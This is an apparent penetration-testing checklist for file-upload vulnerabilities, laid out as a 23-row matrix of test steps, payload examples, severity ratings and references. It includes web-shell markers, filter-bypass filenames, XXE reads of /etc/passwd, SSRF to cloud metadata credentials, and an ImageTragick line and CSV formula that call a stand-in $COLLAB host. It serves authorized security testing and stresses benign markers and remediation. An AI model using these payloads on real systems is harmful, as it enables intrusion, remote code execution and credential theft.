# File Upload — Checklist

Expert per-attack **test-case matrix** for File Upload — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*23 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| UPL-001 | Enumerate EVERY upload point | Recon &amp; Attack Surface | avatar/attachment, imports (CSV/XML/Office), 'import from URL', KYC/docs, admin theme/plugin/template, API/presigned/GraphQL | 1. Find all upload surfaces: avatars/attachments, CSV/XML/Office imports, 'import from URL', KYC docs, admin theme/plugin/template, API/presigned/GraphQL uploads.<br>2. Fingerprint stack/handler (httpx/Wappalyzer) and the serving host (app-origin vs subdomain vs sandbox CDN).<br>3. Stand up an OOB listener; prepare 2 test accounts for overwrite/IDOR proof. | A complete list of upload points, the stack, and the serving host per point. | <code>avatar upload ; POST /import (xlsx) ; import-from-url field ; admin plugin .zip</code> | Import/admin/presigned points are higher-impact and often missed vs the obvious avatar. | Info | 0.0 (N/A) | Burp Suite Pro, httpx, interactsh | CWE-434; OWASP Testing Guide: Testing Upload of Malicious Files (WSTG-BUSL-09) |
| UPL-002 | Baseline the upload — WHERE/URL/HOW + map controls | Baseline (decides severity) | Each upload point, before any attack | 1. Upload a valid file; record WHERE stored (path, guessable?, user-scoped?).<br>2. Fetch it back: WHAT URL serves it (app origin / subdomain / sandbox CDN) and HOW (Content-Type, Content-Disposition inline/attachment, X-Content-Type-Options).<br>3. Probe controls: client-only? extension allow/deny? MIME check? magic check? re-encoded? filename sanitized? size limit?<br>4. Decide the severity ceiling (web-root+handler=RCE / app-origin inline=XSS / parsed=XXE/SSRF / sandboxed=low). | The storage path, serving context, active controls, and severity ceiling are all known. | <code>stored /uploads/&lt;id&gt;.png ; served inline from app-origin ; nosniff MISSING ; ext-denylist only</code> | Baseline decides which attack is even worth trying and the finding's true severity ceiling. | Info | 0.0 (N/A) | Burp Repeater, curl | CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities |
| UPL-003 | Client-side-only validation bypass | Control Bypass | Uploads validated only in JS | 1. If checks are client-side, tamper the request in Burp or call the endpoint directly.<br>2. Change filename/extension/Content-Type post-validation.<br>3. Confirm the server accepts what the JS would have blocked. | The server accepts a file the client-side validation rejected. | <code>bypass JS by editing the multipart request in Burp Repeater; POST directly to $URL</code> | Client-only validation is no control - opens the door to every server-side bypass. | Info | 0.0 (N/A) | Burp Repeater | CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities |
| UPL-004 | MIME / Content-Type bypass | Control Bypass | Per-part Content-Type validation | 1. Classify the model: header-trust / ext-map / magic / image-decode / framework.<br>2. Lie: payload bytes + Content-Type: image/png while keeping an executing extension (shell.php).<br>3. Work the MIME matrix (docs/archives/text/octet-stream); mismatch the triple (CT vs extension vs magic) to find which tier trusts which. | A payload file is accepted under an allowed declared MIME type. | <code>filename=shell.php + Content-Type: image/png + GIF89a;&lt;?php ... ?&gt;</code> | Defeats naive MIME allowlists - a prerequisite for landing the payload. Bypass control. | Info | 0.0 (N/A) | Burp Repeater | CWE-434; PayloadsAllTheThings/Upload Insecure Files |
| UPL-005 | Multipart / parser-confusion structural tricks | Control Bypass | Front-end validator vs back-end framework multipart disagreement | 1. Missing Content-Type (default-allow); duplicate Content-Type (validator reads one, server the other).<br>2. Multiple file parts same name (validator checks #1 clean, server keeps #2); file[] array (only file[0] inspected).<br>3. Filename injection (two filenames, RFC-2231 filename&#42;=, CRLF); Content-Transfer-Encoding: base64; nested multipart/mixed. | A structural disagreement lands an executable/parseable file past the validator. | <code>duplicate Content-Type: image/png + application/x-php ; two file parts (ok.png then shell.phtml)</code> | Beats 'properly combined' magic+MIME+extension checks - the strongest bypass family. | Info | 0.0 (N/A) | Burp Repeater | CWE-434; HackTricks: File Upload |
| UPL-006 | Extension denylist tricks | Control Bypass | Extension denylists | 1. Alt-execution extensions: .phtml/.pht/.phar/.php5/.pgif (PHP), .cer/.asa/.aspx (ASP), .jspx/.jsw (JSP).<br>2. Double-ext (shell.php.jpg / shell.jpg.php), case (.pHp), trailing dot/space/slash, %00 null, ;.jpg, ::$DATA (NTFS ADS).<br>3. Traversal that survives one strip: ....//shell.php. | A file with an executable extension is accepted despite the denylist. | <code>shell.phtml ; shell.php.jpg ; shell.php%00.jpg ; shell.aspx::$DATA ; shell.pHp</code> | Denylists are inherently leaky - restores the executing extension. Bypass control. | Info | 0.0 (N/A) | Burp Repeater | CWE-434; PayloadsAllTheThings/Upload Insecure Files |
| UPL-007 | Magic-byte / polyglot bypass | Control Bypass | Magic-byte / libmagic / image-decode validation | 1. Prepend a valid signature: GIF89a;, %PNG, %PDF-, PK\x03\x04 before the payload.<br>2. EXIF-comment payload (often survives re-encoding): exiftool -Comment='&lt;?php ...?&gt;'.<br>3. Image+code polyglot that is a valid image AND executes/XSSes. | A file passes magic-byte checks yet still carries an executable/scriptable payload. | <code>printf 'GIF89a;\n&lt;?php echo "RCE-POC-".php_uname(); ?&gt;' &gt; shell.gif.php</code> | Defeats content-sniffing controls; EXIF variant survives re-encoding. Bypass control. | Info | 0.0 (N/A) | exiftool, Burp | CWE-434; HackTricks: File Upload |
| UPL-008 | Filename traversal &amp; filename-based XSS | Control Bypass / Impact | Filename used in storage path or reflected in the UI | 1. Path traversal in filename: ../, ....//, %2f, absolute/Windows path -&gt; write outside the intended dir.<br>2. Filename reflected unsanitized -&gt; stored XSS: "&gt;&lt;svg onload=alert(document.domain)&gt;.png.<br>3. Confirm where the filename lands (path vs HTML). | The filename escapes its directory or executes as XSS in the UI. | <code>filename="../../../../var/www/html/poc.php" ; filename="&gt;&lt;svg onload=alert(document.domain)&gt;.png</code> | Arbitrary write location (-&gt; RCE) or stored XSS via filename - High/Critical. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater | CWE-434; CWE-22; CWE-79; PayloadsAllTheThings/Upload Insecure Files |
| UPL-009 | Config-file upload to force execution | Control Bypass / Impact | Directories where .htaccess/web.config/.user.ini apply; nginx+PHP-FPM | 1. Upload .htaccess (AddType application/x-httpd-php .jpg) or web.config (IIS handler) or .user.ini (auto_prepend_file=shell.gif) to force execution of image files.<br>2. nginx cgi.fix_pathinfo=1 path trick: GET /uploads/avatar.jpg/x.php executes the polyglot as PHP.<br>3. Then upload shell.jpg (polyglot) and request it. | An uploaded config file (or the FPM path trick) makes a benign-looking file execute. | <code>.htaccess: AddType application/x-httpd-php .jpg ; .user.ini: auto_prepend_file=shell.gif ; GET /uploads/x.jpg/x.php</code> | Turns an image-only upload into RCE - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-434; HackTricks: File Upload |
| UPL-010 | RCE via web shell (benign marker) | Impact — RCE | File landing in web-root with a matching handler | 1. Upload a marker shell of the server's language: &lt;?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?&gt;.<br>2. Request the stored file's URL.<br>3. Seeing RCE-POC-&lt;hash&gt;-&lt;hostname&gt; = proven RCE. Do NOT add a real backdoor - marker only. | Requesting the uploaded file returns the executed marker output. | <code>&lt;?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?&gt; -&gt; GET /uploads/shell.phtml</code> | Unauthenticated/authenticated RCE via upload - Critical, rarely duplicated. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, poc/ shells | CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities |
| UPL-011 | HTTP PUT / WebDAV / Tomcat-PUT arbitrary file write -&gt; RCE | Impact - RCE | Servers allowing HTTP PUT/WebDAV (Tomcat readonly=false, IIS WebDAV, misconfigured nginx dav_methods); file-PUT APIs - a write primitive that is NOT a form upload (recon 001 can miss it) | 1. Enumerate write methods: OPTIONS -&gt; is PUT/DELETE/MKCOL/MOVE allowed? Try PUT /poc.txt with a marker, then GET it back.<br>2. If PUT works, write an EXECUTABLE using name-filter bypasses: Tomcat CVE-2017-12615 -&gt; PUT /shell.jsp/ or /shell.jsp%20 or /shell.jsp::$DATA ; IIS WebDAV -&gt; PUT a .txt then MOVE to .asp.<br>3. Request the written file -&gt; marker output = RCE. This is arbitrary file WRITE, distinct from a multipart upload form. | A PUT/WebDAV request writes an executable file to a served directory that then executes. | <code>PUT /shell.jsp/ HTTP/1.1 (Tomcat 12615) ; curl -X PUT --data-binary @shell.jsp $URL/shell.jsp%20</code> | Arbitrary file write -&gt; web shell -&gt; RCE via PUT/WebDAV misconfig - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | curl, davtest, Burp | CWE-434; CWE-650; Tomcat CVE-2017-12615/12617; HackTricks: WebDAV / Put method |
| UPL-012 | TOCTOU race — execute before validate/delete | Impact — RCE | Servers that save-then-validate/scan/delete | 1. Upload the shell, then hammer parallel GETs to its URL during the save-&gt;validate-&gt;delete window.<br>2. Success = a 200 with your RCE marker BEFORE the<br>404. 3. Variant: LFI + phpinfo() temp-file race (leak /tmp/phpXXXXXX, include before deletion). | A request hits and executes the shell before the server deletes/quarantines it. | <code>URL=/uploads/shell.php ; for i in $(seq 1 400); do curl -s "$URL?c=echo RCE-POC" &amp; done; wait</code> | RCE even when the server validates-and-deletes - Critical, easily missed. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Turbo Intruder, parallel curl | CWE-434; CWE-367; HackTricks: File Upload |
| UPL-013 | Stored XSS via SVG/HTML (inline from app origin) | Impact — Stored XSS | SVG/HTML served INLINE from the APP ORIGIN (not a sandbox CDN) | 1. Upload an SVG/HTML with script: &lt;svg onload=alert(document.domain)&gt;.<br>2. Confirm it is served inline from the app origin (Content-Disposition not attachment, nosniff missing/irrelevant for SVG).<br>3. alert(document.domain) firing on the app origin = stored XSS. | The uploaded SVG/HTML executes JS in the app's origin when viewed. | <code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;</code> | Stored XSS on the app origin -&gt; session/account theft. High (NOT if sandbox-CDN served). | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Repeater | CWE-434; CWE-79; PortSwigger Web Security Academy: File upload vulnerabilities |
| UPL-014 | XXE via SVG / Office upload | Impact — XXE | SVG or OOXML (DOCX/XLSX/PPTX) parsed server-side | 1. SVG XXE: DOCTYPE entity reading file:///etc/passwd into a &lt;text&gt; node (in-band) or param-entity OOB.<br>2. Office XXE: inject DOCTYPE into word/document.xml, re-zip, upload to a parse/preview feature.<br>3. Benign file first; watch OOB for blind. | The parser reads a local file or fires an OOB callback. | <code>&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;svg&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code> | File read / SSRF via parsed upload - High/Critical. Works even with allowlist+sandbox. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L) | poc/make_svg_xxe.py, oxml_xxe | CWE-434; CWE-611; HackTricks: File Upload |
| UPL-015 | SSRF via 'import from URL' | Impact — SSRF | Server-side fetch of a user-supplied URL | 1. Point the fetch at cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/.<br>2. Internal services / OOB confirm; file:// for LFI if allowed.<br>3. Bypasses: 127.0.0.1.nip.io, decimal IP 2130706433, [::1], attacker-redirect-to-internal. | The server fetches your internal/metadata URL; IAM creds or internal content returned. | <code>import-url = http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> | SSRF -&gt; cloud IAM credential theft = Critical. | Critical | 9.9 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L) | Burp Collaborator, SSRFmap | CWE-434; CWE-918; PortSwigger Web Security Academy: File upload vulnerabilities |
| UPL-016 | Processor RCE / file-read (ImageMagick / exiftool / Ghostscript / ffmpeg) | Impact — Processor CVE | Uploads that are resized/converted/transcoded/thumbnailed | 1. Fingerprint the processor + version (errors/headers/timing).<br>2. ImageMagick ImageTragick (CVE-2016-3714) MVG delegate RCE; CVE-2022-44268 PNG arbitrary file read; exiftool DjVu RCE (CVE-2021-22204); Ghostscript %pipe% (CVE-2023-36664); ffmpeg HLS .m3u8 file-read/SSRF.<br>3. A VALID file of an allowed type is the payload - works past allowlist+sandbox+re-encode. Benign OOB/file only. | The processor executes your benign command or reads a benign file into the output. | <code>MVG: fill 'url(https://x"&#124;curl http://$COLLAB/imagetragick)' ; m3u8 -&gt; file:///etc/hostname</code> | Processing RCE / SSRF-&gt;metadata = Critical; processing file-read = High. Rarely duplicated. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ImageMagick, exiftool, Ghostscript, ffmpeg | CWE-434; ImageTragick CVE-2016-3714; exiftool CVE-2021-22204; HackTricks: File Upload |
| UPL-017 | Zip Slip &amp; symlink archive extraction | Impact — Archive | Features that extract uploaded zip/tar archives | 1. Zip Slip: an entry path ../../../../var/www/html/poc.php writes outside the extract dir -&gt; RCE.<br>2. Symlink archive: tar stores a symlink ENTRY (do NOT use -h) -&gt; app reads/overwrites host files (/etc/passwd, .env, a served JS asset).<br>3. Benign marker in the written file. | Extraction writes/reads outside the intended directory via traversal/symlink. | <code>zip entry: ../../../../var/www/html/poc.php ; ln -s /etc/passwd link &amp;&amp; tar -cf evil.tar link</code> | RCE (Zip Slip) or arbitrary read/overwrite (symlink) - Critical/High. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/make_zipslip.py, tar | CWE-434; CWE-22; HackTricks: File Upload |
| UPL-018 | Overwrite / IDOR of another user's file or trusted config | Impact — Overwrite/IDOR | Storage keys that are guessable or user-controlled | 1. With 2 accounts, overwrite another user's file / shared asset / trusted config by controlling the storage key/path.<br>2. Confirm cross-user impact (their avatar/document replaced).<br>3. Overwriting a served JS/HTML asset -&gt; stored XSS / supply-chain. | An upload overwrites a file belonging to another user or a trusted served asset. | <code>key = /avatars/&lt;victim_id&gt;.png ; overwrite /assets/app.js served to all users</code> | Cross-user tampering / stored XSS / supply-chain via asset overwrite - High/Critical (NOT self-only). | High | 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N) | Burp Repeater | CWE-434; CWE-639; HackTricks: File Upload |
| UPL-019 | Pre-signed URL / direct-to-cloud upload abuse | Impact — Cloud | S3/GCS presigned PUT flows | 1. Intercept the presign response; craft the PUT yourself altering key / Content-Type / ACL.<br>2. KEY control: key=../served-asset or another user's avatar -&gt; overwrite -&gt; stored XSS/supply-chain. CT control: text/html or image/svg+xml served inline -&gt; stored XSS. ACL: x-amz-acl: public-read.<br>3. Over-broad presign (whole bucket / long TTL / any key) -&gt; write beyond your folder. | The presigned PUT writes an unexpected key/type/ACL beyond the intended object. | <code>curl -X PUT '&lt;presigned&gt;' -H 'Content-Type: text/html' -H 'x-amz-acl: public-read' --data-binary @poc.html</code> | Asset overwrite / world-readable objects / stored XSS via cloud misconfig - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater, aws cli | CWE-434; CWE-639; HackTricks: File Upload |
| UPL-020 | CSV / formula injection in imports | Impact — CSV Injection | CSV/XLSX imports later exported &amp; opened by staff | 1. Inject a formula that fires when exported and opened: =HYPERLINK("//$COLLAB/?c="&amp;A1) ; =cmd&#124;'/c calc'!A1.<br>2. Confirm the value is stored and re-exported verbatim.<br>3. Impact realizes in the victim's spreadsheet client (staff). | The imported formula is exported unescaped and executes in a spreadsheet client. | <code>=HYPERLINK("//$COLLAB/?c="&amp;A1,"click") ; @SUM(1+1)&#42;cmd&#124;'/c calc'!A1</code> | Client-side code exec / data exfil against staff who open the export - Medium/High. | Medium | 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) | Burp Repeater | CWE-434; CWE-1236; HackTricks: File Upload |
| UPL-021 | DoS — pixel flood / zip bomb (scope permitting) | Impact — DoS | Image decoders / archive extractors; AUTHORIZE first | 1. Pixel flood: a tiny image with enormous declared dimensions -&gt; memory blowup on decode.<br>2. Zip bomb: nested/repetitive archive with a huge expansion RATIO.<br>3. Demonstrate the RATIO safely; never exhaust prod. | A tiny crafted file causes disproportionate memory/CPU on processing. | <code>42x42-byte PNG declaring 64000x64000 ; nested zip bomb (show ratio only)</code> | Availability impact from one small file - Medium/High (scope required, prove ratio not outage). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) | manual | CWE-434; CWE-400; HackTricks: File Upload |
| UPL-022 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: 'it accepted my file' (acceptance != impact); SVG-XSS served from a sandbox CDN (low ceiling - don't inflate); stored-but-not-executed; self-only overwrite.<br>2. REQUIRE: confirmed execution/parse/serve AND the serving context (app-origin for XSS/RCE).<br>3. Climb to the highest impact the context allows before writing up. | Only candidates with confirmed execution/parse/serve in the right context survive. | <code>accepted-only = not a bug ; SVG XSS on sandbox-CDN = low ; stored-not-executed = keep digging</code> | Protects credibility; upload is dense with 'it accepted my file' false positives. | Info | 0.0 (N/A) | manual | CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities |
| UPL-023 | Client-facing impact &amp; SAFE marker PoC | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Title names the impact ('Unauthenticated RCE via avatar upload'); lead with who is affected.<br>2. Provide the crafted file, the upload request, and the request/response proving impact (marker output / OOB hit / rendered XSS) + screenshot.<br>3. Set CVSS 3.1 + the outcome CWE (434 primary; +611/918/79/22). Remediation: allowlist by validated content, store outside web-root / on a sandbox origin with Content-Disposition: attachment + nosniff, random non-executable names, re-encode images, size limits, scan archives.<br>4. Benign marker only; own accounts; delete uploaded artifacts; de-dupe. | A reproducible, correctly-rated, safe marker PoC with clear remediation. | <code>PoC: crafted file + upload request + impact proof (RCE marker / OOB / XSS) + CVSS + CWE + remediation.</code> | Converts execution/parse/serve into a defensible Critical/High report at the right severity. | Info | 0.0 (N/A) | CVSS calculator, FILE_UPLOAD_REPORT_TEMPLATE.md | CWE-434; CWE-611; CWE-918; CWE-79; CWE-22; FIRST CVSS v3.1; OWASP Testing Guide: Testing Upload of Malicious Files (WSTG-BUSL-09)  &#124;  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; ImageTragick; OWASP File Upload Cheat Sheet |
